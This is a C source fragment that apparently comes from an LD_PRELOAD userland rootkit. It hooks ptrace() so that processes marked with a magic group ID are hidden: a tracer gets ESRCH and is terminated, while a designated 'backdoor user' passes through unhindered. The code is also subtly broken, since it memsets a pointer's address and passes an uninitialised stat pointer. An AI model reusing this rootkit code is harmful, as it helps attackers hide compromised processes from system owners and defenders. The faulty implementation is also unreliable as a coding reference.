long ptrace(void *request, pid_t pid, void *addr, void *data)
{
    HOOK(o_ptrace,CPTRACE);
    if(is_bdusr()) return o_ptrace(request,pid,addr,data);

    if(pid)
    {
        char ppath[128];
        snprintf(ppath, sizeof(ppath), "/proc/%d", pid);

        HOOK(o_xstat, C__XSTAT);
        struct stat *pstat;
        memset(&pstat, 0, sizeof(stat));
        if(o_xstat(_STAT_VER, ppath, pstat) < 0) return o_ptrace(request,pid,addr,data);
        if(pstat->st_gid==MGID) { errno = ESRCH; exit(-1); }
    }

    return o_ptrace(request,pid,addr,data);
}
